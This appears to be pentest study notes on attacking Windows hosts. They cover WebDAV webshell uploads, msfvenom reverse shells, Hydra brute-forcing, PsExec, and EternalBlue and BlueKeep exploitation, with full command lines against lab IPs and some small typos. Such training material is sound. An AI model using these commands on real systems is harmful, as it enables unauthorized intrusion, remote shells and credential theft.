##### Table Of Contents
1. [Windows Vulnerabilities](System_Host%20Based%20Attacks.md#windows-vulnerabilities)
2. [Exploiting Windows Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-windows-vulnerabilities)
	- IIS and WebDav
	- SMB Exploitation with PsExec
	- EternalBlue
	- RDP
	- BlueKeep
1. [Windows Privilege Escalation](System_Host%20Based%20Attacks.md#windows-privilege-escalation)
2. [Windows File System Vulnerabilities](System_Host%20Based%20Attacks.md#windows-file-system-vulnerabilities)
3. [Windows Credential Dumping](System_Host%20Based%20Attacks.md#windows-credential-dumping)
4. [Linux Vulnerabilities](System_Host%20Based%20Attacks.md#linux-vulnerabilities)
5. [Exploiting Linux Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-linux-vulnerabilities)
6. [Linux Privilege Escalation](System_Host%20Based%20Attacks.md#linux-privilege-escalation)
7. [Linux Credential Dumping](System_Host%20Based%20Attacks.md#linux-credential-dumping)


---

## Introduction

System/host-based attacks are specialized attacks targeting specific systems running operating systems like Windows or Linux. These attacks typically occur after gaining access to a network and focus on exploiting inherent vulnerabilities or misconfigurations in servers, workstations, or laptops. Unlike network-based attacks, system-based attacks require a deeper understanding of the target operating system and its specific vulnerabilities. While network services are common attack vectors, system/host-based attacks highlight the importance of focusing on internal OS vulnerabilities once inside the network.

# Windows-Vulnerabilities

The various OS versions makes the threat surface fragmented since some vulnerabilities  that exist in on OS might not be present in another. All Windows versions share common issues:
- The OS is built in C, making them prone to buffer overflows, arbitrary code exec etc. 
- Vulnerable to cross platform vulnerabilities (ie SQL Injection attacks)
- Vulnerable to physical attacks (theft, malicious usb devices)
### Common Windows Vulnerability Types

- **Information Disclosure:** Allows unauthorized access to sensitive data.
- **Buffer Overflows:** Caused by programming errors, allowing malicious code to overwrite memory and potentially execute malware or provide remote access.
- **Remote Code Execution:** Lets attackers execute code remotely on the system.
- **Privilege Escalation:** Allows attackers to elevate privileges post-compromise, often due to misconfigurations.
- **Denial of Service (DoS):** Overloads system resources, preventing normal operation.
### Commonly Exploited Windows Services

- **Microsoft IIS** (TCP 80/443): Web server software used on Windows.
- **WebDAV** (TCP 80/443): HTTP extension for file management on web servers.
- **SMB/CIFS** (TCP 445): File sharing protocol for local networks.
- **RDP** (TCP 3389): Remote access protocol used for GUI-based interactions with Windows systems.
- **WinRM** (TCP 5986/443): Windows remote management protocol for executing remote commands.

# Exploiting-Windows-Vulnerabilities


### IIS-and-WebDav

**IIS (Internet Information Services)** is a web server developed by Microsoft for the Windows NT family. It can be used to host static and dynamic websites and web apps developed in  ASP.NET/ PHP and provides a GUI for managing websites. Typically running on ports 80 and 443, IIS handles executable file extensions like `.asp`, `.aspx`, `.config`, and `.php`.

**WebDAV (Web-based Distributed Authoring and Versioning)** is an extension of HTTP that allows users to  edit/manage files on web servers, essentially turning a web server into a file server. It can run on top of IIS, Apache etc over ports 80/443 and requires authentication via a username and password to connect.
#### WebDAV Exploitation

1. Identify if WebDAV is configured on the IIS server.
2. Check if authentication is needed for WebDAV.  When WebDAV is running on a Windows host, sometimes it doesn't have any authentication. If it does, perform a brute-force attack to find valid credentials for authentication.
3. Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.

#### Initial Nmap Scan

Goal: See if WebDav is enabled, what directory is it enabled on and if authentication is needed

Can run an initial scan to get general information on the target

```
nmap -Pn -sV -sC <target>
```

- `-Pn` = Port scan without ping 
- `-sV`  = Service version check
- `-sC` = Important Here: Runs additional scripts on each port to enumerate information.
- Note: Not specifying port options means nmap will scan the top 1000 most common ports

The `-sC` options is helpful since it can tell if WebDAV is enabled using scripts like '*http-webdav-scan*'. This might not show the directories that WebDav is enabled on, so we can run an additional Nmap script scan using the `http-enum` nmap script against the port WebDav is running (80/443) to confirm the directory and if authentication is enabled:

```
nmap -sV -p80 --script=http-enum <target>
```

The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.

```
http://target/listed_webdav_directory/
```

**Performing a Brute Force Against WebDav** 

We can use `hydra` to perform the brute force against the WebDav service. Be careful of the performing a brute force on any service since it could cause a DoS (Denial of Service). Be aware that wordlists might not have the credentials you're looking for so you'd want to perform more reconnaissance to confirm the users that will have access to WebDav. For the passwords, there's a lot of wordlists out there that might provide the actual credentials.

```
hydra -L users_file -P passwords_file <target> http-get <webdav_directory>
```


Example: 

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


#### Davtest

Davtest is a WebDAV scanner used for scanning, authenticating, and exploiting WebDAV servers. Used for checking if authentication is enabled, authenticate with it and run checks to show what can be done for exploitation.  Davtest comes pre-installed on most penetration testing distributions like Kali and Parrot OS.


**Authentication**

```
davtest -url <target_location>
```
- `-url` = url of DAV location

Example:
```
davtest -url http://10.16.25.85/webdav
```

An `Unauthorized` response would mean valid credentials is required.

To provide the creds, use the `-auth` option and then include  `username:password`:
```
davtest -auth <user>:<password> -url <target__location>
```

Example:
```
davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

The  results for DavTest will have the following checks show in the output
1. **Testing DAV Connection** = Authenticates WebDav and creates a random string for the session (like `E93ge9fF39Giz`) which is  appended to any directory or file that is created
- `http://10.16.25.85/webdav`
	- Also creates a random string for the session (like `E93ge9fF39Giz`)
2. **Creating creating** | Tries creating a directory
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz` 
3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>

### Cadaver

Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.

General Syntax:
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

You'd then be promoted for the username and password

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

##### Upload the Webshell using Cadaver

We can upload a webshell to get some kind of command execution on the target system. A webshell is a script or program uploaded to a web server, which can allow us to remotely execute commands, manipulate files, or access the server's resources. It essentially serves as a backdoor, giving us control over the server.  

1. **Find the Webshell:** Kali Linux comes pre-packaged with various webshells grouped by programming languages including `asp, aspx, cfm, jsp, perl, php `. They can be found in:
```
/usr/share/webshells/
```

Kali has a webshell for asp located at :
```
/usr/share/webshells/asp/webshell.asp
```

2. **Upload the Webshell to the WebDav server**: This can be uploaded through cadaver to the WebDav Server using a PUT command:
```
put /usr/share/webshells/asp/webshell.asp
```

3. **Execute the Webshell script:**  Once the webshell has been uploaded, navigate to that  file location in the WebDav directory it was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/webshell.asp` from the browser, click on the file to trigger the script.
4. **Interact with the Server**:  Webshells normally comes with a user-friendly interface like input fields/search boxes that allows attackers to interact with the compromised server. After executing the `webshell.asp` script, there should be a search box which would let you run commands on the target system where the output would. We can do anything like searching for files, executing shell commands, or navigating directories. 

- List directory content with `dir`
```
dir C:\
```

- Print out file contents
```
type C:\flag.txt
```

### Exploiting WebDav With Metasploit
We're trying to get a meterpreter session(reverse shell) on the target using Metasploit

1. Perform an initial `nmap` scan to check if Webdav is available on the target using the `http-enum` nmap script:
```
nmap -sV -p80 --script=http-enum <target>
```

#### Generating payload using MSFVenom

MSFVenom is used for generating payloads for reverse shells or remote access. We'll generate a reverse_tcp asp payload here. The cmd for msfvenom will need to pick the `-p` payload option, set the `LHOST`/`LPORT` to the IP & local port where the payload will connect back to, the payload's file type `-f` and its name. The payload should be stored in the home directory:

Syntax:
```
msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
```

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.15.12.2 LPORT=1234 -f asp > shell.asp
```

**Note**: If you're not familiar with the target's architecture for `windows/meterpreter/reverse_tcp`, it's recommended to use the x86(32-bit) architecture since it would work for with 32-bit or 64-bit.

##### Upload the Msfvenom Payload using Cadaver

We'll use Cadaver to upload the payload, enter the webdav location on the target and enter the credentials(if needed):
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

Here, we'll upload the payload made by msfvenom using a `PUT` command:
```
dav:/<webdav_directory/> put payload
```

Example:
```
dav:/webdav/> put /root/shell.asp
```

### Setup a listener for the payload using the multi/handler module

We'll need to setup a handler that would wait for the connection from the payload which the `multi/handler` module can be used for.

1. **Start Postgresql and Metasploit** 
```
service postgresql start && msfconsole
```

2. **Use the module**
```
msf6> use multi/handler
```

3. **Configure the module:** Set the configured payload to the one set from msfvenom. For this example, we used `windows/meterpreter/reverse_tcp`. Next, we'll need to set the `LHOST`/`LPORT` to the same one specified in the payload:

```
msf6> set payload windows/meterpreter/reverse_tcp

msf6> set LHOST 10.15.12.2

msf6> set LPORT 1234
```
4. **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.

```
msf6> run
```

5. **Execute the Payload :**  Navigate to that  file location in the WebDav directory that the payload was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/shell.asp` from the browser, click on the file to trigger the script. This should start meterpreter session.


## Automate the process using MSF Modules

We can use the `exploit/windows/iis/iis_webdav_upload_asp` module to upload a meterpreter asp file onto the webdav server which would automate the payload creation/upload process to get a meterpreter session.

1. First, we can search for `iis upload` or just use the module: 
```
search iis upload
```

```
use exploit/windows/iis/iis_webdav_upload_asp
```

2. **Configure the module**: We'll need to provide the username/password for the WebDav server using the `HttpUsername`/`HttpPassword` settings. Also, need to set the target address with `RHOSTS` and then set the `PATH` option to the filename and location where you want to upload the asp file to:
```
set HttpUsername person1
set HttpPassword password9881
set RHOST 10.65.4.88
set PATH /webdav/metasploit.asp
```
3. **Run the exploit**: This should start the meterpreter session
```
exploit
```



## SMB-Exploitation-with-PsExec

SMB (Server Message Block) is a network file-sharing protocol used primarily for sharing files, printers, and other peripherals within a local network. Initially, SMB ran over NetBIOS using port 139 but has since migrated to operate over TCP on port 445. SAMBA is the open-source implementation of SMB on Linux, which allows interoperability with Windows systems, enabling file and device sharing.
##### SMB Authentication Process

The SMB protocol uses two levels of authentication:
- **User Authentication**: Users provide a username and password to access a network resource.
- **Share Authentication**: Users provide a password to access specific, restricted shares.

Both methods rely on the NTLM (NT LAN Manager) challenge-response protocol to securely authenticate without sending the password over the network:
1. <u>Client Sends Username</u>: The client sends its username to the server.
	- *Client sends `"user1"` to the server.*
2. <u>Server Sends a Challenge</u>: The server responds with a unique, random challenge back to the client.
	- *Server sends `XYZ789` to the client.*
3. <u>Client Hashes the Password</u>: The client hashes the user’s password using the NTLM algorithm.
	- *Password `MyPassword123` is hashed to `8F29A0B676...`.*
4. <u>Client Encrypts the Challenge</u>: The client uses the NTLM-hashed password as a key to encrypt the server’s challenge. This is symmetric encryption, where the same secret (hashed password) is shared between client and server.
	- *The client encrypts `XYZ789` with the hash `8F29A0B676...` , producing `D4E8F6A2...`.*
5. <u>Client Sends Encrypted Response</u>: The client sends the challenge encrypted using the NTLM hashed password  challenge back.
	- *Client sends `D4E8F6A2...` to the server.*
6. <u>Server Verifies the Response</u>: The server encrypts the challenge it sent using the NTLM hash of the password for the account as a key, just like the client did. It then compares the result to the client’s response. If they match, authentication succeeds.
	- *The server encrypts `XYZ789` using the stored hash. If the result matches `D4E8F6A2...`, authentication succeeds.*

##### PsExec 

PsExec is a remote command execution tool developed by Microsoft to replace telnet, allowing administrators to execute commands on remote Windows systems using valid user credentials.  PxExec operates over SMB for authentication, using the provided credentials to run processes remotely, including launching command prompts or executing scripts.

Unlike Remote Desktop Protocol (RDP), which provides graphical control over the target system, PsExec focuses on command-line interactions, allowing commands to be run directly without GUI access.

##### SMB Exploitation with PsExec

To exploit SMB using PsExec, attackers typically aim to obtain legitimate credentials, such as a username and password or password hash. This can be achieved through techniques like SMB login brute-force attacks, focusing on common Windows user accounts (e.g., **Administrator**).

Once valid credentials are obtained, the attacker can authenticate with the remote system via PsExec and execute arbitrary commands or initiate a reverse shell. This effectively gives the attacker command-line control over the system, allowing them to perform malicious activities or further escalate their privileges within the network.


1. **Initial Nmap Scan**: Use the `-sV` flag to get the service version and `-sC` to run the default nmap script scans. If you get results like `smb2..` we can authenticate the SMB service using PsExec
```
nmap -sV -sC target
```

2. **Perform SMB Brute Force**: This can be done through the smb_login metasploit auxiliary module. Start PostgreSQL and Metasploit `service postgresql && msfconsole`, then either just search for `smb_login` or just use `auxiliary/scanner/smb/smb_login`. 

```
### (Optional) search smb_login ###

use auxiliary/scanner/smb/smb_login
```

1. Configure the Smb_login module: We'll need to provide the `RHOSTS` for the target. We could provide `SMBDomain` if the target is domain-joined including the domain account and password with `SMBUser`/`SMBPass`. Since we're performing a brute-force, we'll need to set the `USER_FILE` and `PASS_FILE` file, some sample wordlists are:
	- Users: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- Passwords: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
We also want to just see the successful logins so we can also set the `VERBOSE` option to false.
```
set RHOSTS 10.33.60.54

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set USER/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

set VERBOSE false
```

Run the module using `run`. Keep track of any Administrator accounts.

#### Psexec Python Script

Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 

```
psexec.py Username@Target <cmd_to_execute_on_system>
```
Example: You can run psexec.py against the target and try to execute a shell using cmd.exe:
```
psexec.py Administrator@10.63.45.88 cmd.exe
```

#### PsExec Metasploit Module

The psexec exploit module `exploit/windows/smb/psexec`  will authenticate through psexec to smb and then upload a meterpreter payload.  This is installing software on the target so be aware of Antivirus solutions which could detection the software as malicious.

1. <u>Find/Use the module</u>: Can just search for `psexec` and select the psexec exploit or `use exploit/windows/smb/psexec `. The payload will probably be set to `windows/meterpreter/reverse_tcp` which 32-bit but its fine:
```
#### search psexec ####

use exploit/windows/smb/psexec
```
3. <u>Configure the module</u>: We'll need to set the target with `RHOSTS` and then the `SMBUser`  and `SMBPass` of the account. You can also configure the payload which you can set to your machine `LHOST` & `LPORT`.

```
set RHOST target
set SMBUser <username>
set SMBPass <password>
```
4. Run the exploit using just `exploit`. This should start a meterpreter session when done.


### EternalBlue

EternalBlue (CVE-2017-0144) is a Windows vulnerability developed by the NSA that exploits a flaw in the SMBv1 protocol, allowing attackers to remotely execute code by sending crafted packets. It can lead to reverse shells or meterpreter sessions and includes automatic privilege escalation. The vulnerability gained notoriety during the **WannaCry ransomware attack** in 2017, which used EternalBlue to spread across networks, infecting Windows systems. EternalBlue impacts various Windows versions, including Vista, 7/8.1/10, and Windows Server 2008/2012/2016, particularly effective on Windows 7/8.1 and Server 2008/2012. A patch was released in March 2017, though many systems remain unpatched.

Metasploit offers an **auxiliary module** to check for vulnerable systems and an **exploit module** to target unpatched systems, providing privileged access and a meterpreter session.

#### Initial Nmap Scan to Check if Vulnerable to Eternal Blue

Run an Nmap scan to identify open ports but we're mainly interested in SMB which is 445. Include the  `smb-vuln-ms17-010` Nmap script to check if the target is vulnerable to the Eternal Blue exploit:

```
nmap -sV -O -p445 --script=smb-vuln-ms17-010 target
```

- `-sV`= Checks the version of services
- `-O` = Checks Operating system | Will confirm what version of windows is running
- `-p 445` = Port 445

If the system is vulnerable, we can execute the exploit.
#### Option A.) Manual Exploitation of Eternal Blue

###### Manual Exploitation Process: 
1. <u>Generate Shellcode/Payload</u>: To exploit EternalBlue using AutoBlue, we first need to generate shellcode payload, that gives us a reverse shell after the SMB vulnerability has been exploited.
2. <u>Setup listener</u>: Once that's generated, we'll need to setup our netcat listener
3. <u>Run the python exploit</u>: Run the python exploit script (`eternalblue_exploit*.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener

**Autoblue** is an automated script used to exploit the EternalBlue vulnerability (CVE-2017-0144), without the need for Metasploit.   You can clone the AutoBlue repository (https://github.com/3ndG4me/AutoBlue-MS17-010): 
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

The folder will contain:
1. Python exploit files for each version of Windows
	- `eternalblue_exploit7.py` (and server 08)
	- `eternalblue_exploit8.py` (and 8.1)
	- `eternalblue_exploit10.py`
2. requirements.txt  - Helpful for getting python dependencies installed
```
pip install -r requirements.txt
```
3. 'shellcode' directory: Will have the script we need for creating the payload
##### Generating Shell Code

We're going to run the bash script `shell_prep.sh` under the `shellcode` directory of the package (`../EternalBlue/AutoBlue-MS17-010/shellcode`). 

1. **Double-check permission**:Make sure to add execution permissions to the script before attempting to run it:
```
chmod +x shell_prep.sh
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**
```
./shell_prep.sh
```

3. **Respond to  'Eternal Blue Windows Shellcode Compiler' prompt**:  Should get the prompt `...would you like to auto generate a reverse shell with msfvenom (Y/n`. **msfvenom** is a tool that generates payloads, which are small pieces of code sent to a target system once it's compromised. In this case, it will create a **reverse shell**, which means the compromised system will initiate a connection back to an attacker's machine (us), allowing remote control. We'll say `yes` here.

- Set your machine's IP for `LHOST` (Local Host)
```
LHOST for reverse connection: 
10.23.25.45
```
- Set you listening ports of your machine for the payloads:
```
LPORT you want x64 to listen to:
1234
LPORT you want x86 to listen to:
1234
```
- Specify if you want to generate a meterpreter shell or regular cmd shell (We'll choose 1)
```
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
```
- Specify if you want to generate a staged or stageless payload: A **non-staged (stageless) payload** sends the entire payload all at once, whereas  staged payloads sends a small piece first before sending the rest. 

```
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
```

- **Generate the payload**: It will take to some to generate the shellcode but it would be saved  in the shellcode directory. **The payload will be exported into a bin file (ie `sc_x64_msf.bin`) which is where the shell code is saved.** Once its generated, we should be able to execute either the x64 or x86 shell code depending on the target OS's architecture.  Now we can setup our netcat listener.
##### Set up Netcat Listener 
Netcat (often abbreviated as **nc**) is a networking tool used for tasks like port scanning, file transfers, and establishing connections between computers. One of its key features is the ability to set up a listener, which waits for incoming connections on a specified port. To set up a basic listener in Netcat, you would use the command `nc -l -p <port>`, where the **-l** flag tells Netcat to listen and **-p** specifies the port number. 

```
nc -nvlp 123
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames (use raw IP addresses instead). This speeds things up and avoids DNS lookups.
- `-v`:  (Optional) Runs Netcat in **verbose** mode, providing detailed output

This creates a simple server that will wait for incoming data or connections on the chosen port. We'll need to keep the tab open and wait for the shell. With the listener setup, now we can run the python executables for the exploit.

##### Running the Exploit

1. We're going to run the bash script `shell_prep.sh`. Make sure to add execution permissions to the python script before attempting to run it:

```
chmod +x eternalblue_exploit7.py
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**: Specify the `eternalblue_exploit*.py` script, target and then the binary file for the shellcode
```
python eternalblue_exploit_py target shellcode_binary
```

Example
```
python eternalblue_exploit7.py 10.82.54.22 shellcode/sc_x64.bin
```

If you go back to the netcat listener, you'll see the cmd-shell open from it.

### Option B.) Exploit with Metasploit

1. Open `msfconsole`
```
msfconsole
```

2. Search for the Eternal Blue exploit:  There's an auxiliary module (auxiliary/scanner/smb/smb_ms17_010) that tells you if the system is vulnerable and a exploit module `exploit/windows/smb/ms17_010_eternalblue`. Go and select the exploit....
```
search eternalblue

use exploit/windows/smb/ms17_010_eternalblue
```
3. Configure and run the exploit module: Mainly just need to set the target and your machine's IP and local port.
	- `RHOSTS` = Target system 
	- `LHOST`/`LPORT` | Your system's local host IP and its listening port

```
set RHOSTS 10.82.54.22 
```

After configuring changes, run the exploit using `exploit`. The exploit is done and a meterpreter session should be established. The username allowed should be NT AUTHORITY\\SYSTEM


### RDP

The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. <u>We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target</u>. 

1. **Perform an initial Nmap scan against the target**: Make sure to scan the entire TCP port range `-p-` since RDP could be configured on a different port. Can also ran this as a SYN Scan `-sS` to make this more stealthier.
```
nmap -sV -O -sS -p- target
```

If you don't see a RDP confirmed on port 3389 or as a service you have two options:
- **Option A**: Connecting directly to RDP on that target and specify the port you believe to be for RDP
- **Option B**: Run the metasploit RDP scanner to confirm if RDP is available on the system.


#### Checking for RDP using Metasploit

We can use the rdp_scanner auxiliary module which would check the ports to see if it can communicate using RDP:

1. Start Postgresql/Metasploit console:
```
service postgresql && msfconsole
```
2. Either search for `rdp_scanner` or use `auxiliary/scanner/rdp/rdp_scanner` 
```
search rdp_scanner

use auxiliary/scanner/rdp/rdp_scanner
```
3. **Configure the module**: We'll need to set the target address using `RHOSTS` and then specify the `RPORT` to a port we believe RDP is running on.

```
set RHOSTS 192.168.41.2

set RPORT 4876
```

4. **Run the scanner**: Use `run` to execute the scanner, it should return build number and some other hostname information of the target also. After getting a confirmation of RDP running on the target, we can brute force to find credentials.

##### Perform Brute Force using Hydra

Hydra can be used here to perform a brute force against the RDP service on the target. Be aware that this could cause a DoS event so the speed of the brute force might need to be adjusted depending on the environment. You need to specify the user name list `-L`, the password list `-P` the protocol like for RDP it would be `rdp://` and the port number `-s`.

- Example User Wordlist: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Example Password Wordlist: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L user_list  -P  password_list  protocol://target -s port_number 
```

Example:
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.42.2.41 -s 3333 
```

Hydra will try to actually to connect with any valid credentials using the freerdp client. We'll be using `xfreerdp` to actually connect to the target system.

#### Connect to the Target using XfreeRDP

**xfreerdp** is an open-source client that allows users to connect to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:

```
xfreerdp /u:username /p:password /v:target_ip:rdp_port_number
```

Example:
```
xfreerdp /u:administrator /p:qwertyuiop /v:10.24.5.1:3333
```

This will return the RDP GUI windows for the target.

## BlueKeep

BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by <u>gaining access to a chunk of kernel memory</u> and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.

The exploit will fail unless the following prerequisites are met:
1. RDP needs to be enabled
2. Network-level authentication (NLA) can't be enabled

The BlueKeep vulnerability has illegitimate proof of concepts (PoCs) and exploit code that could be malicious, potentially performing tasks unrelated to the exploit itself. Microsoft did not release public PoCs or exploit code for BlueKeep, as doing so would have worsened the vulnerability's impact. Security researchers created PoCs without payloads, demonstrating the vulnerability by performing non-malicious actions like creating files, rather than executing reverse shells. It's recommended to only use verified exploit code to avoid malicious variants.

The BlueKeep exploit includes an MSF auxiliary module to check if a system is vulnerable and an exploit module to target unpatched systems. However, the exploit requires adjustments based on the Windows version and the memory chunk size needed to execute the code. When successful, the exploit provides a standard command shell or a meterpreter session on the target.

1. Perform a port scan to confirm if RDP is running on the target:
```
nmap -p 3389 target
```
2. Run the metasploit auxiliary module to confirm if the version of RDP is vulnerable. Start metasploit with `msfconsole`, and then search '`Bluekeep`':
```
search Bluekeep
```
The results will have the auxiliary module `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` and the exploit, the exploit will also run the aux scanner module. 
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
### or "use 0/1" ##
```
Make any configuration changes for the scanner
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```
Type `run`  to start the scan
```
run
```

Run the exploit:

We can select the exploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` 
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
### or "use 0/1" ##
```

Configure the module options:
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```

Configure the payload options 
- `LHOST` (Listening Host) = Your local machine
- `LPORT`(Listening Port) = The port on your system to listen

Just type `exploit`  to run the exploit
```
exploit
```

Might get a `bad-config` response if you don't specify a target, the module gives the ability to specify the target configuration or version of Windows to target

```
show targets
```

Set target to whatever the ID of the OS running on the target
```
set target 2
```

Part of the output would include something along the lines of `Using CHUNK Grooming strategy. Size 250MB, target address 0xfffffx8011e07000, Channel count 1`.

**Grooming** is the process of preparing a system’s memory or other states to manipulate how resources—such as memory blocks or file handles—are allocated or managed. The goal of grooming is to position vulnerable memory segments in predictable locations, making it easier for an exploit to succeed by taking advantage of these weaknesses.

A common form of grooming is **chunk grooming**, which specifically targets heap memory. The **heap** is a region of memory used for dynamic allocation during the runtime of programs. It's structured into units called **chunks**, which vary in size. Chunk grooming involves controlling how these chunks are allocated and placed, ensuring that vulnerable memory blocks are aligned in a way that increases the likelihood of a successful attack.

In this case, the groomer reserves large blocks of memory in RAM —such as the `250MB` mentioned in the output. By doing so, it forces the operating system to place the vulnerable memory segment (at the address `0xfffffx8011e07000`) in a location that the attacker can predict. Without this grooming, memory could be allocated randomly, which would make it much harder for the exploit to reliably target and manipulate the vulnerable segment. By carefully "grooming" the memory layout, the attacker increases the likelihood that their code will be successfully executed. 

You can try adjusting the size of memory used if this fails.

After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 

# Windows-Privilege-Escalation

# Windows-File-System-Vulnerabilities

# Windows-Credential Dumping
# Linux-Vulnerabilities

# Exploiting-Linux-Vulnerabilities

# Linux-Privilege-Escalation

# Linux-Credential-Dumping